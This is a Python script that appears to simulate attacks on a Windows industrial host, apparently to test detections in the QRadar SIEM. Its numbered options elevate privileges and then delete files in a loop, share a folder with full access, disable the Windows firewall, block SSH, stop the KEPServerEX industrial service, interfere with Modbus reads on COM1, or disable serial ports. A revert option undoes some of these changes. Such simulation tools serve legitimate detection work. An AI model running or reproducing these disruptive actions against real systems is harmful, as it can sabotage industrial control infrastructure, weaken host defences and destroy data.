#import os
from os import walk, path, remove, system, getcwd
#import time
from time import sleep
import threading
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE
from ctypes import windll
from sys import executable, argv
from win32netcon import ACCESS_ALL
import win32net

copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory

#Check if administrator
def check_admin():
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

#Delete file in specific folder
def delete_files(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
                remove(og)
                print("File: " + str(og) + " is deleted")
        sleep(5)

def copy_file(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
                print("File: " + str(og) + " is copied")
        sleep(5)

    

#Disable firewall
def disable_firewall():
    cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Firewall disabled successfully")
    else:
        print("Firewall failed to disable")

#Disable ssh from firewall
def disable_ssh():
    cp = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Inbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")
    cp = run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22',stdout=PIPE)
    if cp.stdout.decode('utf-8').strip() == "Ok.":
        print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
    else:
        print("Outbound Firewall Failed to be Inserted")

#Disable Kepserver Service
def disable_kepserver():
    service_name = "KEPServerEXV6"
    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
    output = cp.stdout.decode('utf-8').strip().split()
    if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
    else:
        print("The " + output[1] + " service is " + output[9])

#Run modpoll to interrupt COM1 port
def run_modinterrup():
    current_directory = os.getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
    try:
        check_call([executable_path] + parameters)
    except CalledProcessError as e:
        print("Error executing the executable file:", e)

#Disable COM Port
def disable_COMPort():
    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
    dump = cp.stdout.split()
    deviceID = ""
    deviceArr = []
    for i in range(0, len(dump)):
        if dump[i].decode("utf-8") == "ID:":
            deviceID = dump[i+1].decode("utf-8")
            deviceArr.append(deviceID)
            print(str(len(deviceArr)) + " : " + deviceID)
    userInput = input("Choose device to disable, e.g. 1, 2, 3 \n")
    batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/disable-device\" \"" + deviceArr[int(userInput)-1] + "\""
    with open("script.bat", "w") as f:
        f.write(batchscript)
    cp = run(["script.bat"],stdout=PIPE ,shell=True)
    print(cp.stdout.decode('utf-8'))
    remove("script.bat")

#Create Shared Folder
def Create_Share_folder():
    folder_path = r'C:\Windows\temp\Smartmeter'

    # Create the folder if it does not already exist
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)

    # Set the share information
    share_name = 'SmartMeterfolder'
    share_path = folder_path
    share_remark = 'Shared folder for full access'

    # Create the share
    share_info = {
        'netname': share_name,
        'path': share_path,
        'remark': share_remark,
        'max_uses': -1,
        'current_uses': 0,
        'permissions': ACCESS_ALL,
        'security_descriptor': None
    }

    win32net.NetShareAdd(None, 2, share_info)

def revert(revertoption):
    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport
    if revertoption == "1":
        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
        if cp.stdout.decode('utf-8').strip() == "Ok.":
            print("Firewall enabled successfully")
        else:
            print("Firewall failed to enable")
        
    elif revertoption == "2":
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Inbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")
        
    elif revertoption == "3":
        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9])
        
    elif revertoption == "4":
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                deviceArr.append(deviceID)
                print(str(len(deviceArr)) + " : " + deviceID)
        userInput = input("Choose device to re-enable, e.g. 1, 2, 3 \n")
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + deviceArr[int(userInput)-1] + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        print(cp.stdout.decode('utf-8'))
        remove("script.bat")

if __name__ == '__main__':
    check_admin()
    attackoption = str(argv[1])
    if attackoption == "1":
        delete_files(copiedpath)
    elif attackoption == "2":
        Create_Share_folder()
        copy_file(copiedpath)
    elif attackoption == "3":
        disable_firewall()
    elif attackoption == "4":
        disable_ssh()
    elif attackoption == "5":
        disable_kepserver()
    elif attackoption == "6":
        run_modinterrup()
    elif attackoption == "7":
        disable_COMPort()
    elif attackoption == "8":
        revertoption = str(argv[2])
        revert(revertoption)
    elif attackoption == "-h":
        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to revert with options.")
    else:
        print ("Invalid Option!")
